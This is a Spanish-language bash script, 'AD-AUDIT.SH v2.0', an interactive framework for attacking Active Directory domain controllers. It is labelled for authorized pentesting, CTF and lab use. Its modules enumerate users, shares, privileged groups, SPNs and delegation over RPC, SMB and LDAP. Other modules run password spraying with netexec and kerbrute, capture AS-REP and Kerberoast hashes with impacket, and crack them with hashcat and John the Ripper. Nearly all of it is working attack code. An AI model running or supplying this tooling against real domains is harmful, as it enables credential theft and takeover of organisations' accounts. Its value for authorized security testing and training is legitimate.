#!/usr/bin/env bash
# =============================================================================
#  AD-AUDIT.SH v2.0 — Herramienta de auditoría de Active Directory
#  Autor: Tony / Sr.Robot Labs
#  SOLO para uso en entornos autorizados (pentesting, CTF, lab propio)
# =============================================================================

# ─── Guard: requiere bash ≥4, no sh/dash ─────────────────────────────────────
if [ -z "${BASH_VERSION:-}" ]; then
    echo "ERROR: Este script requiere bash, no sh/dash."
    echo "Ejecútalo con:  bash ad_audit.sh"
    exit 1
fi
if [ "${BASH_VERSINFO[0]}" -lt 4 ]; then
    echo "ERROR: Se requiere bash 4 o superior (tienes ${BASH_VERSION})."
    exit 1
fi

# Desactivamos 'exit on error' global para manejar errores por módulo
set -uo pipefail

# ─── Colores ─────────────────────────────────────────────────────────────────
RED='\033[0;31m';    GREEN='\033[0;32m';  YELLOW='\033[1;33m'
BLUE='\033[0;34m';   CYAN='\033[0;36m'
BOLD='\033[1m';      DIM='\033[2m';       RESET='\033[0m'

# ─── Variables globales (exportadas para subshells y source) ─────────────────
export TARGET_IP="${TARGET_IP:-}"
export TARGET_DOMAIN="${TARGET_DOMAIN:-}"
export TARGET_USER="${TARGET_USER:-}"
export TARGET_PASS="${TARGET_PASS:-}"
export TARGET_HASH="${TARGET_HASH:-}"
export OUTPUT_DIR="${OUTPUT_DIR:-}"
export LOG_FILE="${LOG_FILE:-/tmp/ad_audit_bootstrap.log}"  # log temporal hasta configurar OUTPUT_DIR
export REPORT_FILE="${REPORT_FILE:-}"
export START_TIME; START_TIME=$(date +%s)
export WORDLIST_PASS="${WORDLIST_PASS:-/usr/share/wordlists/rockyou.txt}"
export WORDLIST_USERS="${WORDLIST_USERS:-/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt}"

# ─── Sugerencias de instalación (case/esac — sin arrays asociativos) ────────
get_install_hint() {
    case "$1" in
        rpcclient)             echo "apt install samba-common-bin" ;;
        smbclient)             echo "apt install smbclient" ;;
        smbmap)                echo "apt install smbmap   |   pip install smbmap" ;;
        netexec)               echo "pip install netexec" ;;
        ldapsearch)            echo "apt install ldap-utils" ;;
        evil-winrm)            echo "gem install evil-winrm" ;;
        kerbrute)              echo "https://github.com/ropnop/kerbrute/releases" ;;
        hashcat)               echo "apt install hashcat" ;;
        john)                  echo "apt install john" ;;
        bloodhound-python)     echo "pip install bloodhound" ;;
        neo4j)                 echo "apt install neo4j" ;;
        impacket-GetNPUsers|\
        impacket-GetUserSPNs|\
        impacket-secretsdump)  echo "pip install impacket" ;;
        *)                     echo "(sin informacion de instalacion)" ;;
    esac
}

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
    clear
    echo -e "${RED}"
    cat << 'BANNER'
  ___   ___         _             _ _ _
 / _ \ |   \  __ _ | | _  _   __| (_) |_
| (_) || |) |/ _` || || || | / _` || |  _|
 \___/ |___/ \__,_||_| \_,_| \__,_||_|\__|
BANNER
    echo -e "${RESET}${DIM}  AD Auditing Framework v2.0 — Sr.Robot Labs${RESET}"
    echo -e "${DIM}  $(date '+%Y-%m-%d %H:%M:%S') | SOLO para uso en entornos autorizados${RESET}"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

# ─── Utilidades de logging ────────────────────────────────────────────────────
_logwrite() { echo -e "$*" >> "$LOG_FILE" 2>/dev/null || true; }
log()     { local msg; msg="[$(date +%H:%M:%S)] $*"; echo -e "${DIM}${msg}${RESET}"; _logwrite "$msg"; }
info()    { local msg="[*] $*"; echo -e "${CYAN}${msg}${RESET}"; _logwrite "$msg"; }
ok()      { local msg="[+] $*"; echo -e "${GREEN}${msg}${RESET}"; _logwrite "$msg"; }
warn()    { local msg="[!] $*"; echo -e "${YELLOW}${msg}${RESET}"; _logwrite "$msg"; }
err()     { local msg="[-] $*"; echo -e "${RED}${msg}${RESET}"; _logwrite "$msg"; }

section() {
    local title="$*"
    echo -e "\n${BOLD}${BLUE}╔══════════════════════════════════════════════════╗${RESET}"
    printf "${BOLD}${BLUE}║  %-48s║${RESET}\n" "$title"
    echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════╝${RESET}\n"
    _logwrite "\n=== ${title} ==="
}

pause() {
    echo -e "\n${DIM}Presiona ENTER para continuar...${RESET}"
    read -r
}

# ─── Check de herramienta con sugerencia de instalación ──────────────────────
check_tool() {
    local tool="$1"
    if command -v "$tool" &>/dev/null; then
        return 0
    fi
    warn "Herramienta '${BOLD}${tool}${RESET}${YELLOW}' no encontrada."
    local hint
    hint=$(get_install_hint "$tool")
    [[ "$hint" != "(sin informacion de instalacion)" ]] && \
        echo -e "    ${DIM}→ Instala con: ${hint}${RESET}"
    return 1
}

# Busca la variante disponible de impacket (sistema o pip)
find_impacket() {
    local base="$1"    # ej: GetNPUsers
    # Orden: impacket-GetNPUsers > GetNPUsers.py > python3 -m impacket.examples.GetNPUsers
    if command -v "impacket-${base}" &>/dev/null; then
        echo "impacket-${base}"
    elif command -v "${base}.py" &>/dev/null; then
        echo "${base}.py"
    else
        echo ""
    fi
}

# ─── Verificación de dependencias al inicio ───────────────────────────────────
check_all_tools() {
    section "Verificación de herramientas del sistema"
    local tools_ok=0 tools_miss=0

    # Herramientas directas
    local direct_tools=(rpcclient smbclient smbmap netexec ldapsearch evil-winrm
                        kerbrute hashcat john bloodhound-python neo4j)
    # Impacket: detectadas como impacket-X o X.py
    local impacket_bases=(GetNPUsers GetUserSPNs secretsdump)

    printf "  %-30s %s\n" "HERRAMIENTA" "ESTADO"
    echo -e "  ${DIM}$(printf '─%.0s' {1..50})${RESET}"

    for tool in "${direct_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            printf "  ${GREEN}%-30s ✓ Disponible${RESET}\n" "$tool"
            ((tools_ok++))
        else
            local found=0
            for variant in "${tool}.py" "python3-${tool}"; do
                if command -v "$variant" &>/dev/null; then
                    printf "  ${YELLOW}%-30s ✓ Como '%s'${RESET}\n" "$tool" "$variant"
                    ((tools_ok++))
                    found=1
                    break
                fi
            done
            if [[ $found -eq 0 ]]; then
                printf "  ${RED}%-30s ✗ No instalada${RESET}\n" "$tool"
                printf "  ${DIM}  → %s${RESET}\n" "$(get_install_hint "$tool")"
                ((tools_miss++))
            fi
        fi
    done

    # Impacket tools — usar find_impacket() que detecta variantes X.py
    for base in "${impacket_bases[@]}"; do
        local label="impacket-${base}"
        local found_cmd
        found_cmd=$(find_impacket "$base")
        if [[ -n "$found_cmd" ]]; then
            printf "  ${GREEN}%-30s ✓ Como '%s'${RESET}\n" "$label" "$found_cmd"
            ((tools_ok++))
        else
            printf "  ${RED}%-30s ✗ No instalada${RESET}\n" "$label"
            printf "  ${DIM}  → impacket (pip install impacket)${RESET}\n"
            ((tools_miss++))
        fi
    done

    echo -e "\n  ${GREEN}Disponibles: ${tools_ok}${RESET}  |  ${RED}Faltantes: ${tools_miss}${RESET}"

    # Verificar wordlists
    echo -e "\n  ${BOLD}Wordlists:${RESET}"
    [[ -f "$WORDLIST_PASS" ]]  && printf "  ${GREEN}%-40s ✓${RESET}\n" "$WORDLIST_PASS" \
                               || printf "  ${RED}%-40s ✗ No encontrada${RESET}\n" "$WORDLIST_PASS"
    [[ -f "$WORDLIST_USERS" ]] && printf "  ${GREEN}%-40s ✓${RESET}\n" "$WORDLIST_USERS" \
                               || printf "  ${RED}%-40s ✗ No encontrada${RESET}\n" "$WORDLIST_USERS"

    pause
}

# ─── Configuración inicial ────────────────────────────────────────────────────
setup_config() {
    section "Configuración de la auditoría"

    read -rp "$(echo -e "${CYAN}[?]${RESET} IP del DC objetivo: ")" TARGET_IP
    [[ -z "$TARGET_IP" ]] && { err "IP requerida"; return 1; }

    read -rp "$(echo -e "${CYAN}[?]${RESET} Dominio (ej: corp.local): ")" TARGET_DOMAIN
    [[ -z "$TARGET_DOMAIN" ]] && { err "Dominio requerido"; return 1; }

    local default_out
    default_out="./ad_audit_$(date +%Y%m%d_%H%M)"
    read -rp "$(echo -e "${CYAN}[?]${RESET} Directorio de salida [${default_out}]: ")" OUTPUT_DIR
    OUTPUT_DIR="${OUTPUT_DIR:-$default_out}"
    export OUTPUT_DIR

    mkdir -p "$OUTPUT_DIR"/{enum,smb,kerberos,bloodhound,lateral,cracking} || {
        err "No se pudo crear el directorio de salida: $OUTPUT_DIR"
        return 1
    }

    LOG_FILE="$OUTPUT_DIR/audit.log"
    REPORT_FILE="$OUTPUT_DIR/REPORT.md"
    export LOG_FILE REPORT_FILE
    touch "$LOG_FILE" "$REPORT_FILE"

    # Wordlists personalizadas
    read -rp "$(echo -e "${CYAN}[?]${RESET} Wordlist contraseñas [${WORDLIST_PASS}]: ")" wl_pass
    WORDLIST_PASS="${wl_pass:-$WORDLIST_PASS}"
    read -rp "$(echo -e "${CYAN}[?]${RESET} Wordlist usuarios    [${WORDLIST_USERS}]: ")" wl_users
    WORDLIST_USERS="${wl_users:-$WORDLIST_USERS}"

    echo -ne "\n${YELLOW}[?] ¿Tienes credenciales? (s/n): ${RESET}"
    read -r has_creds
    if [[ "$has_creds" =~ ^[sS]$ ]]; then
        read -rp "$(echo -e "${CYAN}[?]${RESET} Usuario: ")" TARGET_USER
        read -rsp "$(echo -e "${CYAN}[?]${RESET} Contraseña (vacío si usas hash NTLM): ")" TARGET_PASS
        echo
        if [[ -z "$TARGET_PASS" ]]; then
            read -rp "$(echo -e "${CYAN}[?]${RESET} Hash NTLM (formato LM:NT o solo NT): ")" TARGET_HASH
        fi
    fi

    ok "Configuración guardada"
    log "Target: $TARGET_IP | Domain: $TARGET_DOMAIN | User: ${TARGET_USER:-anonymous}"
    init_report
}

# ─── Informe Markdown ─────────────────────────────────────────────────────────
init_report() {
    cat > "$REPORT_FILE" << MDEOF
# Informe de Auditoría — Active Directory
**Generado:** $(date '+%Y-%m-%d %H:%M:%S')
**Target:** \`$TARGET_IP\` — \`$TARGET_DOMAIN\`
**Auditor:** ${TARGET_USER:-anonymous}

> ⚠️ Documento confidencial. Solo para uso en entornos con autorización explícita.

---
MDEOF
}

report_section() { printf '\n## %s\n\n' "$1" >> "$REPORT_FILE"; }
report_add()     { printf '%s\n' "$*" >> "$REPORT_FILE"; }
report_code()    {
    # $1 = título, $2 = fichero
    local title="$1" file="$2"
    if [[ -s "$file" ]]; then
        printf '\n### %s\n```\n' "$title" >> "$REPORT_FILE"
        head -200 "$file" >> "$REPORT_FILE"
        printf '```\n' >> "$REPORT_FILE"
    fi
}

run_nxc_smb() {
    # Wrapper seguro para netexec smb
    local extra_args=("$@")
    if [[ -n "$TARGET_HASH" ]]; then
        netexec smb "$TARGET_IP" -u "$TARGET_USER" -H "$TARGET_HASH" "${extra_args[@]}" 2>/dev/null
    elif [[ -n "$TARGET_USER" ]]; then
        netexec smb "$TARGET_IP" -u "$TARGET_USER" -p "$TARGET_PASS" "${extra_args[@]}" 2>/dev/null
    else
        netexec smb "$TARGET_IP" -u '' -p '' "${extra_args[@]}" 2>/dev/null
    fi
}

# ─── MÓDULO 1: Enumeración anónima ───────────────────────────────────────────
module_anon_enum() {
    section "MÓDULO 1 — Enumeración anónima / sin credenciales"
    report_section "1. Enumeración anónima"

    # --- NetExec banner grab ---
    if check_tool netexec; then
        info "NetExec — banner SMB..."
        netexec smb "$TARGET_IP" 2>/dev/null | tee "$OUTPUT_DIR/enum/nxc_banner.txt"
        report_code "NetExec SMB Banner" "$OUTPUT_DIR/enum/nxc_banner.txt"
    fi

    # --- RPC anónimo ---
    if check_tool rpcclient; then
        info "RPC anónimo (querydominfo / enumdomusers / enumdomgroups)..."
        local rpc_out="$OUTPUT_DIR/enum/rpc_anon.txt"
        {
            echo "=== querydominfo ==="
            rpcclient -U "" -N "$TARGET_IP" -c "querydominfo" 2>/dev/null || echo "[sin acceso]"
            echo "=== enumdomusers ==="
            rpcclient -U "" -N "$TARGET_IP" -c "enumdomusers" 2>/dev/null || echo "[sin acceso]"
            echo "=== enumdomgroups ==="
            rpcclient -U "" -N "$TARGET_IP" -c "enumdomgroups" 2>/dev/null || echo "[sin acceso]"
            echo "=== lsaquery ==="
            rpcclient -U "" -N "$TARGET_IP" -c "lsaquery" 2>/dev/null || echo "[sin acceso]"
        } | tee "$rpc_out"
        grep -q "Domain Name" "$rpc_out" 2>/dev/null \
            && ok "RPC anónimo exitoso — dominio visible" \
            || warn "RPC anónimo bloqueado o sin información"
        report_code "RPC Anónimo" "$rpc_out"
    fi

    # --- SMBMap anónimo ---
    if check_tool smbmap; then
        info "SMBMap sin credenciales..."
        smbmap -H "$TARGET_IP" 2>/dev/null | tee "$OUTPUT_DIR/smb/smbmap_anon.txt"
        report_code "SMBMap anónimo" "$OUTPUT_DIR/smb/smbmap_anon.txt"
    fi

    # --- smbclient anónimo ---
    if check_tool smbclient; then
        info "smbclient — lista de shares anónima..."
        smbclient -L "//$TARGET_IP" -N 2>/dev/null | tee "$OUTPUT_DIR/smb/smbclient_anon.txt"
        report_code "smbclient shares" "$OUTPUT_DIR/smb/smbclient_anon.txt"
    fi

    # --- LDAP anónimo ---
    if check_tool ldapsearch; then
        local ldap_base
        ldap_base="DC=$(echo "$TARGET_DOMAIN" | sed 's/\./,DC=/g')"
        info "LDAP anónimo — base: $ldap_base"
        ldapsearch -x -H "ldap://$TARGET_IP" -b "$ldap_base" \
            "(objectClass=person)" cn sAMAccountName description 2>/dev/null \
            | head -150 | tee "$OUTPUT_DIR/enum/ldap_anon.txt"
        [[ -s "$OUTPUT_DIR/enum/ldap_anon.txt" ]] \
            && ok "LDAP anónimo accesible" || warn "LDAP anónimo bloqueado"
        report_code "LDAP Anónimo" "$OUTPUT_DIR/enum/ldap_anon.txt"
    fi

    ok "Módulo 1 completado → $OUTPUT_DIR/enum/"
}

# ─── MÓDULO 2: Enumeración con credenciales ───────────────────────────────────
module_creds_enum() {
    section "MÓDULO 2 — Enumeración autenticada"
    report_section "2. Enumeración con credenciales"

    if [[ -z "$TARGET_USER" ]]; then
        warn "No hay credenciales configuradas. Saltando módulo 2."
        return 0
    fi

    # --- NetExec completo ---
    if check_tool netexec; then
        for flag in --users --groups --shares --pass-pol --rid-brute --disks; do
            local fname
            fname=$(echo "$flag" | tr -d '-')
            info "NetExec SMB $flag..."
            run_nxc_smb "$flag" | tee "$OUTPUT_DIR/enum/nxc_${fname}.txt"
            report_code "NetExec $flag" "$OUTPUT_DIR/enum/nxc_${fname}.txt"
        done

        # LDAP via netexec
        info "NetExec LDAP — usuarios con descripción..."
        if [[ -n "$TARGET_HASH" ]]; then
            netexec ldap "$TARGET_IP" -u "$TARGET_USER" -H "$TARGET_HASH" \
                -M get-desc-users 2>/dev/null | tee "$OUTPUT_DIR/enum/nxc_desc_users.txt"
        else
            netexec ldap "$TARGET_IP" -u "$TARGET_USER" -p "$TARGET_PASS" \
                -M get-desc-users 2>/dev/null | tee "$OUTPUT_DIR/enum/nxc_desc_users.txt"
        fi
        report_code "Usuarios con descripción (posibles passwords)" "$OUTPUT_DIR/enum/nxc_desc_users.txt"
    fi

    # --- SMBMap autenticado y recursivo ---
    if check_tool smbmap; then
        info "SMBMap autenticado (recursivo, depth=3)..."
        if [[ -n "$TARGET_HASH" ]]; then
            smbmap -H "$TARGET_IP" -u "$TARGET_USER" -p "$TARGET_HASH" --no-color -r \
                2>/dev/null | tee "$OUTPUT_DIR/smb/smbmap_auth.txt"
        else
            smbmap -H "$TARGET_IP" -u "$TARGET_USER" -p "$TARGET_PASS" --no-color -r \
                2>/dev/null | tee "$OUTPUT_DIR/smb/smbmap_auth.txt"
        fi
        report_code "SMBMap autenticado" "$OUTPUT_DIR/smb/smbmap_auth.txt"
    fi

    # --- RPC autenticado ---
    if check_tool rpcclient; then
        info "RPC autenticado — enumprivs / queryuserinfo..."
        {
            echo "=== enumdomusers ==="
            rpcclient -U "$TARGET_DOMAIN/$TARGET_USER%$TARGET_PASS" "$TARGET_IP" \
                -c "enumdomusers" 2>/dev/null || echo "[error]"
            echo "=== enumprivs ==="
            rpcclient -U "$TARGET_DOMAIN/$TARGET_USER%$TARGET_PASS" "$TARGET_IP" \
                -c "enumprivs" 2>/dev/null || echo "[error]"
            echo "=== enumalsgroups builtin ==="
            rpcclient -U "$TARGET_DOMAIN/$TARGET_USER%$TARGET_PASS" "$TARGET_IP" \
                -c "enumalsgroups builtin" 2>/dev/null || echo "[error]"
        } | tee "$OUTPUT_DIR/enum/rpc_auth.txt"
        report_code "RPC autenticado" "$OUTPUT_DIR/enum/rpc_auth.txt"
    fi

    # --- LDAP profundo ---
    if check_tool ldapsearch; then
        local ldap_base
        ldap_base="DC=$(echo "$TARGET_DOMAIN" | sed 's/\./,DC=/g')"
        info "LDAP profundo — AdminCount, SPN, UAC, lastLogon..."
        ldapsearch -x -H "ldap://$TARGET_IP" \
            -D "$TARGET_USER@$TARGET_DOMAIN" -w "$TARGET_PASS" \
            -b "$ldap_base" \
            "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
            sAMAccountName userPrincipalName adminCount memberOf \
            userAccountControl lastLogon pwdLastSet description \
            2>/dev/null | tee "$OUTPUT_DIR/enum/ldap_deep.txt"
        report_code "LDAP profundo — atributos de usuarios" "$OUTPUT_DIR/enum/ldap_deep.txt"

        info "LDAP — búsqueda de SPNs (cuentas Kerberoasteables)..."
        ldapsearch -x -H "ldap://$TARGET_IP" \
            -D "$TARGET_USER@$TARGET_DOMAIN" -w "$TARGET_PASS" \
            -b "$ldap_base" \
            "(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))" \
            sAMAccountName servicePrincipalName 2>/dev/null \
            | tee "$OUTPUT_DIR/enum/ldap_spns.txt"
        report_code "SPNs via LDAP" "$OUTPUT_DIR/enum/ldap_spns.txt"

        info "LDAP — grupos privilegiados (Domain Admins, Enterprise Admins)..."
        for group in "Domain Admins" "Enterprise Admins" "Administrators" "Schema Admins"; do
            echo "=== $group ===" >> "$OUTPUT_DIR/enum/ldap_priv_groups.txt"
            ldapsearch -x -H "ldap://$TARGET_IP" \
                -D "$TARGET_USER@$TARGET_DOMAIN" -w "$TARGET_PASS" \
                -b "$ldap_base" \
                "(cn=${group})" member 2>/dev/null \
                >> "$OUTPUT_DIR/enum/ldap_priv_groups.txt"
        done
        report_code "Grupos privilegiados" "$OUTPUT_DIR/enum/ldap_priv_groups.txt"

        info "LDAP — ACLs (delegación de control)..."
        ldapsearch -x -H "ldap://$TARGET_IP" \
            -D "$TARGET_USER@$TARGET_DOMAIN" -w "$TARGET_PASS" \
            -b "$ldap_base" \
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
            sAMAccountName distinguishedName 2>/dev/null \
            | tee "$OUTPUT_DIR/enum/ldap_delegation.txt"
        report_code "Delegación de control (RBCD)" "$OUTPUT_DIR/enum/ldap_delegation.txt"
    fi

    # --- Password Spraying ---
    info "¿Ejecutar password spraying con NetExec? (s/n): \c"
    read -r do_spray
    if [[ "$do_spray" =~ ^[sS]$ ]] && check_tool netexec; then
        read -rp "$(echo -e "${CYAN}[?]${RESET} Contraseña a probar (ej: Welcome1): ")" spray_pass
        read -rp "$(echo -e "${CYAN}[?]${RESET} Fichero de usuarios [${OUTPUT_DIR}/enum/nxc_users.txt]: ")" spray_users
        spray_users="${spray_users:-$OUTPUT_DIR/enum/nxc_users.txt}"

        if [[ -f "$spray_users" ]]; then
            info "Spraying '$spray_pass' contra todos los usuarios..."
            warn "Cuidado con el lockout — comprueba la política de bloqueo primero"
            netexec smb "$TARGET_IP" -u "$spray_users" -p "$spray_pass" \
                --continue-on-success 2>/dev/null \
                | tee "$OUTPUT_DIR/enum/spray_results.txt"
            grep -i "pwn3d\|\[+\]" "$OUTPUT_DIR/enum/spray_results.txt" 2>/dev/null \
                && ok "¡Credenciales válidas encontradas!" || info "Sin credenciales válidas para '$spray_pass'"
            report_code "Password Spraying" "$OUTPUT_DIR/enum/spray_results.txt"
        else
            warn "Fichero de usuarios no encontrado: $spray_users"
        fi
    fi

    ok "Módulo 2 completado → $OUTPUT_DIR/enum/"
}

# ─── MÓDULO 3: Kerberoasting / AS-REP Roasting ───────────────────────────────
module_kerberos() {
    section "MÓDULO 3 — Kerberoasting / AS-REP Roasting"
    report_section "3. Ataques Kerberos"

    # ── AS-REP Roasting ──
    info "AS-REP Roasting (cuentas sin pre-autenticación Kerberos)..."
    local npusers_cmd
    npusers_cmd=$(find_impacket "GetNPUsers")

    if [[ -n "$npusers_cmd" ]]; then
        local asrep_out="$OUTPUT_DIR/kerberos/asrep_hashes.txt"

        if [[ -n "$TARGET_USER" ]]; then
            # Con credenciales — enumera automáticamente
            if [[ -n "$TARGET_HASH" ]]; then
                $npusers_cmd "$TARGET_DOMAIN/$TARGET_USER" -hashes ":$TARGET_HASH" \
                    -dc-ip "$TARGET_IP" -format hashcat \
                    -outputfile "$asrep_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/asrep_output.txt"
            else
                $npusers_cmd "$TARGET_DOMAIN/$TARGET_USER:$TARGET_PASS" \
                    -dc-ip "$TARGET_IP" -format hashcat \
                    -outputfile "$asrep_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/asrep_output.txt"
            fi
        else
            # Sin credenciales — necesita lista de usuarios
            if [[ -f "$WORDLIST_USERS" ]]; then
                $npusers_cmd "$TARGET_DOMAIN/" -dc-ip "$TARGET_IP" \
                    -usersfile "$WORDLIST_USERS" -format hashcat \
                    -outputfile "$asrep_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/asrep_output.txt"
            elif [[ -f "$OUTPUT_DIR/enum/nxc_users.txt" ]]; then
                # Extraer usuarios del output de netexec
                grep -oP '(?<=\\)[^\s]+(?=\s)' "$OUTPUT_DIR/enum/nxc_users.txt" 2>/dev/null \
                    > "$OUTPUT_DIR/enum/userlist_extracted.txt" || true
                $npusers_cmd "$TARGET_DOMAIN/" -dc-ip "$TARGET_IP" \
                    -usersfile "$OUTPUT_DIR/enum/userlist_extracted.txt" \
                    -format hashcat -outputfile "$asrep_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/asrep_output.txt"
            else
                warn "No hay lista de usuarios disponible para AS-REP sin creds"
            fi
        fi

        if [[ -s "$asrep_out" ]]; then
            ok "¡Hashes AS-REP capturados! → $asrep_out"
            cat "$asrep_out"
            report_code "AS-REP Hashes" "$asrep_out"
            module_crack_hashes "$asrep_out" "18200" "AS-REP"
        else
            info "No se encontraron cuentas vulnerables a AS-REP Roasting"
        fi
    else
        warn "impacket no encontrado — instala con: pip install impacket"
    fi

    # ── Kerberoasting ──
    if [[ -n "$TARGET_USER" ]]; then
        info "Kerberoasting — solicitando tickets TGS para cuentas con SPN..."
        local spns_cmd
        spns_cmd=$(find_impacket "GetUserSPNs")

        if [[ -n "$spns_cmd" ]]; then
            local kerb_out="$OUTPUT_DIR/kerberos/kerberoast_hashes.txt"
            if [[ -n "$TARGET_HASH" ]]; then
                $spns_cmd "$TARGET_DOMAIN/$TARGET_USER" -hashes ":$TARGET_HASH" \
                    -dc-ip "$TARGET_IP" -request \
                    -outputfile "$kerb_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/kerberoast_output.txt"
            else
                $spns_cmd "$TARGET_DOMAIN/$TARGET_USER:$TARGET_PASS" \
                    -dc-ip "$TARGET_IP" -request \
                    -outputfile "$kerb_out" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/kerberoast_output.txt"
            fi

            if [[ -s "$kerb_out" ]]; then
                ok "¡Tickets Kerberoast capturados! → $kerb_out"
                cat "$kerb_out"
                report_code "Kerberoast Hashes (TGS)" "$kerb_out"
                module_crack_hashes "$kerb_out" "13100" "Kerberoast"
            else
                info "No se encontraron cuentas Kerberoasteables"
            fi
        fi
    else
        warn "Kerberoasting requiere credenciales válidas"
    fi

    # ── Kerbrute — enumeración y spray ──
    if check_tool kerbrute; then
        echo -ne "\n${YELLOW}[?] ¿Usar Kerbrute para enumeración de usuarios? (s/n): ${RESET}"
        read -r use_kerbrute
        if [[ "$use_kerbrute" =~ ^[sS]$ ]]; then
            local kbr_wl="$WORDLIST_USERS"
            read -rp "$(echo -e "${CYAN}[?]${RESET} Wordlist usuarios [${kbr_wl}]: ")" kbr_in
            kbr_wl="${kbr_in:-$kbr_wl}"

            if [[ -f "$kbr_wl" ]]; then
                info "Kerbrute userenum..."
                kerbrute userenum --dc "$TARGET_IP" -d "$TARGET_DOMAIN" "$kbr_wl" \
                    -o "$OUTPUT_DIR/kerberos/kerbrute_users.txt" 2>/dev/null \
                    | tee "$OUTPUT_DIR/kerberos/kerbrute_output.txt"
                report_code "Kerbrute — usuarios válidos" "$OUTPUT_DIR/kerberos/kerbrute_users.txt"

                echo -ne "${YELLOW}[?] ¿Hacer password spray con Kerbrute? (s/n): ${RESET}"
                read -r do_kbr_spray
                if [[ "$do_kbr_spray" =~ ^[sS]$ ]]; then
                    read -rp "$(echo -e "${CYAN}[?]${RESET} Contraseña a probar: ")" kbr_pass
                    kerbrute passwordspray --dc "$TARGET_IP" -d "$TARGET_DOMAIN" \
                        "$OUTPUT_DIR/kerberos/kerbrute_users.txt" "$kbr_pass" \
                        2>/dev/null | tee "$OUTPUT_DIR/kerberos/kerbrute_spray.txt"
                    report_code "Kerbrute spray" "$OUTPUT_DIR/kerberos/kerbrute_spray.txt"
                fi
            else
                warn "Wordlist no encontrada: $kbr_wl"
            fi
        fi
    fi

    ok "Módulo 3 completado → $OUTPUT_DIR/kerberos/"
}

# ─── MÓDULO 4: Cracking de hashes ────────────────────────────────────────────
module_crack_hashes() {
    # Puede llamarse desde otros módulos o desde el menú
    local hash_file="${1:-}"
    local hash_mode="${2:-}"  # hashcat mode
    local hash_type="${3:-Hash}"

    if [[ -z "$hash_file" ]]; then
        section "MÓDULO 4 — Cracking de hashes"
        report_section "4. Cracking de hashes"

        echo -e "  Tipos de hash disponibles:"
        echo -e "  ${BOLD}[1]${RESET} NTLM         (hashcat -m 1000)"
        echo -e "  ${BOLD}[2]${RESET} NTLMv2       (hashcat -m 5600)"
        echo -e "  ${BOLD}[3]${RESET} AS-REP       (hashcat -m 18200)"
        echo -e "  ${BOLD}[4]${RESET} Kerberoast   (hashcat -m 13100)"
        echo -e "  ${BOLD}[5]${RESET} Personalizado"
        echo -ne "  ${CYAN}Tipo: ${RESET}"
        read -r htype

        case "$htype" in
            1) hash_mode="1000";  hash_type="NTLM" ;;
            2) hash_mode="5600";  hash_type="NTLMv2" ;;
            3) hash_mode="18200"; hash_type="AS-REP" ;;
            4) hash_mode="13100"; hash_type="Kerberoast" ;;
            5) read -rp "$(echo -e "${CYAN}[?]${RESET} Modo hashcat (-m): ")" hash_mode
               read -rp "$(echo -e "${CYAN}[?]${RESET} Descripción: ")" hash_type ;;
            *) warn "Opción no válida"; return 1 ;;
        esac

        read -rp "$(echo -e "${CYAN}[?]${RESET} Fichero de hashes: ")" hash_file
        [[ ! -f "$hash_file" ]] && { err "Fichero no encontrado: $hash_file"; return 1; }
    fi

    local crack_out="$OUTPUT_DIR/cracking/${hash_type}_cracked.txt"
    local potfile="$OUTPUT_DIR/cracking/${hash_type}.potfile"

    info "Cracking de hashes ${hash_type}..."
    info "Fichero: $hash_file | Modo: $hash_mode | Wordlist: $WORDLIST_PASS"

    # ── Hashcat ──
    if check_tool hashcat; then
        info "Intentando con hashcat..."
        hashcat -m "$hash_mode" "$hash_file" "$WORDLIST_PASS" \
            --potfile-path "$potfile" \
            -o "$crack_out" \
            --force 2>/dev/null \
            | tee "$OUTPUT_DIR/cracking/hashcat_${hash_type}_output.txt"

        # Mostrar resultados del potfile
        if [[ -s "$crack_out" ]]; then
            ok "¡Hashes crackeados con hashcat!"
            cat "$crack_out"
            report_code "${hash_type} — Contraseñas crackeadas (hashcat)" "$crack_out"
        elif [[ -s "$potfile" ]]; then
            ok "Resultados en potfile:"
            cat "$potfile"
        else
            info "Hashcat no encontró coincidencias con la wordlist dada"
        fi

        # Reglas — intento adicional con best64
        if [[ ! -s "$crack_out" ]]; then
            local rules_file="/usr/share/hashcat/rules/best64.rule"
            if [[ -f "$rules_file" ]]; then
                info "Reintentando con reglas best64..."
                hashcat -m "$hash_mode" "$hash_file" "$WORDLIST_PASS" \
                    -r "$rules_file" \
                    --potfile-path "$potfile" \
                    -o "$crack_out" \
                    --force 2>/dev/null \
                    | tee -a "$OUTPUT_DIR/cracking/hashcat_${hash_type}_output.txt"
            fi
        fi
    fi

    # ── John the Ripper ── (si hashcat no crackea o no está disponible)
    if [[ ! -s "$crack_out" ]] && check_tool john; then
        info "Intentando con John the Ripper..."
        local john_format=""
        case "$hash_mode" in
            1000)  john_format="--format=NT" ;;
            5600)  john_format="--format=netntlmv2" ;;
            18200) john_format="--format=krb5asrep" ;;
            13100) john_format="--format=krb5tgs" ;;
            *)     john_format="" ;;
        esac

        john $john_format "$hash_file" --wordlist="$WORDLIST_PASS" \
            2>/dev/null | tee "$OUTPUT_DIR/cracking/john_${hash_type}_output.txt"

        # Mostrar contraseñas encontradas
        john $john_format "$hash_file" --show \
            2>/dev/null | tee "$crack_out"

        if [[ -s "$crack_out" ]] && grep -q ":" "$crack_out" 2>/dev/null; then
            ok "¡John the Ripper crackeó hashes!"
            cat "$crack_out"
            report_code "${hash_type} — Contraseñas crackeadas (john)" "$crack_out"
        else
            info "John no encontró coincidencias"
            warn "Sugiero probar con una wordlist más grande o reglas adicionales:"
            echo -e "    hashcat -m $hash_mode $hash_file /path/to/wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule"
            echo -e "    john --format=<fmt> $hash_file --wordlist=/path/to/wordlist.txt --rules=All"
        fi
    fi
}

